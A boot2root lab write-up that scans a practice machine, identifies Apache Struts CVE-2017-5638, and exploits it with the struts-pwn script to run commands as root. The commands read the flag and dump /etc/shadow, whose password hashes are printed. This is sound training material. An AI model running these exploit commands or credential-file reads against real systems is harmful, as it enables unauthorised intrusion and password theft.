---
date:
  created: 2023-12-19
  updated: 2023-12-19
description: Oxygen Writeup
tags:
  - apache-struts
comments: true
---

# Oxygen

Today we will doing Boot2Root machine, Oxygen.

![](/images/writeup/internship/oxygen/oxygen.PNG)

## Reconnaissance

`IP = 192.168.8.114`

First and foremost, doing nmap scan to gather information of the machine. We get this. For this time, I will scan all things:- TCP,UDP.

### PORT

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/nmap]
└─# nmap -p- --min-rate 10000 192.168.8.114                       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 02:57 EDT
Nmap scan report for 192.168.8.114
Host is up (0.0022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.70 seconds
```
### TCP

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/nmap]
└─# cat tcpscan.txt 
# Nmap 7.94 scan initiated Thu Nov  2 21:12:24 2023 as: nmap -sV -sC -p 22,8080 -o nmap/tcpscan.txt 192.168.8.114
Nmap scan report for 192.168.8.114
Host is up (0.0022s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 3f:eb:13:04:af:2b:ab:d0:20:8a:d6:b9:7b:bc:0b:39 (RSA)
|   256 4f:9d:3c:8b:06:65:dd:5c:19:0d:a8:9f:cc:d3:da:11 (ECDSA)
|_  256 b0:81:90:25:01:46:87:e8:4a:a8:bc:de:38:8f:e8:32 (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Struts2 Showcase
|_Requested resource was showcase.action
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1108
|     Date: Fri, 03 Nov 2023 01:12:33 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=A9A5A06A913393BF1F1919846D0232B2; Path=/; HttpOnly
|     Location: http://localhost:8080/showcase.action
|     Content-Type: text/html
|     Content-Length: 0
|     Date: Fri, 03 Nov 2023 01:12:33 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 405 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1108
|     Date: Fri, 03 Nov 2023 01:12:33 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 405 
|     Method Not Allowed</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></he
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Fri, 03 Nov 2023 01:12:33 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=11/2%Time=6544490D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F1,"HTTP/1\.1\x20302\x20\r\nSet-Cookie:\x20JSESSIONID=A9A5A06A
SF:913393BF1F1919846D0232B2;\x20Path=/;\x20HttpOnly\r\nLocation:\x20http:/
SF:/localhost:8080/showcase\.action\r\nContent-Type:\x20text/html\r\nConte
SF:nt-Length:\x200\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2001:12:33\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,4F0,"HTTP/1\.1\x20405
SF:\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x
SF:20en\r\nContent-Length:\x201108\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x
SF:2001:12:33\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><htm
SF:l\x20lang=\"en\"><head><title>HTTP\x20Status\x20405\x20\xe2\x80\x93\x20
SF:Method\x20Not\x20Allowed</title><style\x20type=\"text/css\">h1\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahom
SF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;
SF:}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgroun
SF:d-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-ser
SF:if;background:white;color:black;font-size:12px;}\x20a\x20{color:black;}
SF:\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-color
SF::#525D76;border:none;}</style></he")%r(RTSPRequest,49,"HTTP/1\.1\x20400
SF:\x20\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2001:12:33\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(FourOhFourRequest,4F0,"HTTP/1\.1\x20404\x20\
SF:r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\
SF:r\nContent-Length:\x201108\r\nDate:\x20Fri,\x2003\x20Nov\x202023\x2001:
SF:12:33\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20
SF:lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80\x93\x20Not\x
SF:20Found</title><style\x20type=\"text/css\">h1\x20{font-family:Tahoma,Ar
SF:ial,sans-serif;color:white;background-color:#525D76;font-size:22px;}\x2
SF:0h2\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-colo
SF:r:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-seri
SF:f;color:white;background-color:#525D76;font-size:14px;}\x20body\x20{fon
SF:t-family:Tahoma,Arial,sans-serif;color:black;background-color:white;}\x
SF:20b\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-colo
SF:r:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-serif;background:whi
SF:te;color:black;font-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{c
SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
SF:one;}</style></head><body>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  2 21:12:59 2023 -- 1 IP address (1 host up) scanned in 34.95 seconds
```

We can see here, there is port `8080` which is proxy-server. It connected to the machine directly.
### UDP

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/nmap]
└─# cat udpscan.txt 
# Nmap 7.94 scan initiated Thu Nov  2 21:12:58 2023 as: nmap -sU -T4 -vv -o nmap/udpscan.txt 192.168.8.114
Increasing send delay for 192.168.8.114 from 0 to 50 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.8.114 from 50 to 100 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.8.114 from 100 to 200 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.8.114 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.8.114 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.8.114 from 800 to 1000 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 192.168.8.114
Host is up, received reset ttl 128 (0.00083s latency).
Scanned at 2023-11-02 21:13:11 EDT for 1599s
All 1000 scanned ports on 192.168.8.114 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Nov  2 21:39:50 2023 -- 1 IP address (1 host up) scanned in 1612.59 seconds
```

## Enumeration

### Web page

![](/images/writeup/internship/oxygen/intro.png)

We go to the web page and suddenly `/showcase.action` will open as also shown on nmap. Emm interesting here, but we keep on enumerate if something related to `CVE` or injection, file upload or anything. Directly we doing directory brute.

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/nmap]
└─# dirb http://192.168.8.114:8080/        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov  3 03:01:42 2023
URL_BASE: http://192.168.8.114:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.8.114:8080/ ----
+ http://192.168.8.114:8080/date (CODE:200|SIZE:11244)                            
+ http://192.168.8.114:8080/docs (CODE:302|SIZE:0)                                
+ http://192.168.8.114:8080/examples (CODE:302|SIZE:0)                            
+ http://192.168.8.114:8080/host-manager (CODE:302|SIZE:0)                        
+ http://192.168.8.114:8080/manager (CODE:302|SIZE:0)                             
+ http://192.168.8.114:8080/toggle (CODE:200|SIZE:191)                            
+ http://192.168.8.114:8080/tree (CODE:200|SIZE:907)                             

-----------------
END_TIME: Fri Nov  3 03:02:27 2023
DOWNLOADED: 4612 - FOUND: 7
```

Doing some directory brute using feroxbuster or dirb, we got something interesting. So I just go thru this directory. On directory docs, there is something that we can look up to which is `version` of the web pages `Version 9.0.0`

![](/images/writeup/internship/oxygen/apache.png)

So how about we find on the google if there is public exploit already. 

![](/images/writeup/internship/oxygen/apache1.png)

There is something that we can do on here, but I dont try it because suddenly come into my mind that what if I search for the web pages title itself which is `Apache Struts` 

![](/images/writeup/internship/oxygen/strut.png)

![](/images/writeup/internship/oxygen/strutgoogle.png)

Open and read the PoC and this article said something interesting [https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede](https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede)

We read and try to understand this CVE. we bump up to this article

[https://nvd.nist.gov/vuln/detail/CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)

On this article it said that Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string. According to Apache, the vulnerability exists in the [Jakarta Multipart](https://cwiki.apache.org/confluence/display/WW/S2-045) parser

Back to the medium blog, to check whether the application is vulnerable or not. We can try to scan it using `nmap` like this

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/nmap]
└─# nmap -p 8080 --script http-vuln-cve2017-5638 --script-args path=/showcase.action 192.168.8.114
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 03:37 EDT
Nmap scan report for 192.168.8.114
Host is up (0.0022s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-vuln-cve2017-5638: 
|   VULNERABLE:
|   Apache Struts Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-5638
|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
|       vulnerability via the Content-Type header.
|           
|     Disclosure date: 2017-03-07
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
|       https://cwiki.apache.org/confluence/display/WW/S2-045
|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html

Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```

Here we can see, the application is vulnerable.

## Exploitation

For the exploitation part, I will be using this script [https://github.com/mazen160/struts-pwn](https://github.com/mazen160/struts-pwn) 

On this script it added a Content type header that will open the `cmd` and we can give a command to find something interesting.

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/struts-pwn]
└─# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'id'

[*] URL: http://192.168.8.114:8080/showcase.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

uid=0(root) gid=0(root) groups=0(root)

[%] Done.
```

We can see here, directly the `id` is `root`. So it will be easy for us to find the flag because there is no need to do the reverse shell and escalate to the root. 

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/struts-pwn]
└─# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'find / -name "flag.txt" 2>/dev/null'

[*] URL: http://192.168.8.114:8080/showcase.action
[*] CMD: find / -name "flag.txt" 2>/dev/null
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

/var/secret/flag.txt

[%] Done.
```

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/struts-pwn]
└─# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'cat /var/secret/flag.txt'

[*] URL: http://192.168.8.114:8080/showcase.action
[*] CMD: cat /var/secret/flag.txt
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

flag{7fc4b2162cc4d91d5ababf66c968380d}

[%] Done.
```

We got the flag.

## Bonus

```js
┌──(root㉿kali)-[/home/…/Desktop/internship/oxygen/struts-pwn]
└─# python struts-pwn.py --url 'http://192.168.8.114:8080/showcase.action' -c 'cat /etc/shadow'

[*] URL: http://192.168.8.114:8080/showcase.action
[*] CMD: cat /etc/shadow
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

root:$6$2G8KrtUL$hxJuBdQdvFWqWKwzzudZ.P/JYlQGAQAPlzPZhoODv2Kdig8X4VqFXF63DkGUK1osqDpdiCKqjala/YM3h9vka.:17947:0:99999:7:::
daemon:*:17945:0:99999:7:::
bin:*:17945:0:99999:7:::
sys:*:17945:0:99999:7:::
sync:*:17945:0:99999:7:::
games:*:17945:0:99999:7:::
man:*:17945:0:99999:7:::
lp:*:17945:0:99999:7:::
mail:*:17945:0:99999:7:::
news:*:17945:0:99999:7:::
uucp:*:17945:0:99999:7:::
proxy:*:17945:0:99999:7:::
www-data:*:17945:0:99999:7:::
backup:*:17945:0:99999:7:::
list:*:17945:0:99999:7:::
irc:*:17945:0:99999:7:::
gnats:*:17945:0:99999:7:::
nobody:*:17945:0:99999:7:::
systemd-timesync:*:17945:0:99999:7:::
systemd-network:*:17945:0:99999:7:::
systemd-resolve:*:17945:0:99999:7:::
systemd-bus-proxy:*:17945:0:99999:7:::
_apt:*:17945:0:99999:7:::
messagebus:*:17945:0:99999:7:::
jimmy:$6$4zCTIlcp$OcsDPbTu9a7tQammSKsLVUj2uXaFIeE3EGNOSMf0RnAgzMXGDaGneYyyb2Q1xdZ098taNijyid2VQEg8Es0Jc/:17946:0:99999:7:::
sshd:*:17945:0:99999:7:::

[%] Done.
```

If the `id` is not root, we can try to find the hash file contains of the password and use the `hashcat` password cracking. And also we can try using the reverse shell that related to this application. 





